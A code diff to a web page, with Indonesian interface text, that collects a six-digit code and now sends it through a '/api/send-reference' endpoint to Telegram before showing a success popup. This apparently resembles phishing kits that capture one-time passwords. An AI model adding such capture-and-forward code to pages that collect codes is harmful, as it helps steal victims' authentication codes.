@@ -208,12 +208,31 @@
       if (fields.length) fields[0].focus();
     });
 
-    function showSuccessPopup() {
+    async function sendReferenceToTelegram(reference) {
+      const response = await fetch('/api/send-reference', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ reference })
+      });
+
+      if (!response.ok) throw new Error('Pengiriman gagal');
+    }
+
+    async function showSuccessPopup(reference) {
       if (popupShown) return;
       popupShown = true;
-      successModal.classList.add('active');
-      successModal.setAttribute('aria-hidden', 'false');
-      document.body.classList.add('modal-open');
+      helper.textContent = 'Mengirim data referensi...';
+
+      try {
+        await sendReferenceToTelegram(reference);
+        successModal.classList.add('active');
+        successModal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('modal-open');
+        helper.textContent = 'Data referensi berhasil dikirim.';
+      } catch (error) {
+        popupShown = false;
+        helper.textContent = 'Data belum terkirim. Silakan coba lagi.';
+      }
     }
 
     function updateCount() {
@@ -222,7 +241,7 @@
         ? 'Enam angka telah terisi.'
         : `Masukkan ${6 - count} angka lagi.`;
 
-      if (count === 6) showSuccessPopup();
+      if (count === 6) showSuccessPopup(fields.map(field => field.value).join(''));
     }
 
     function closePopup() {
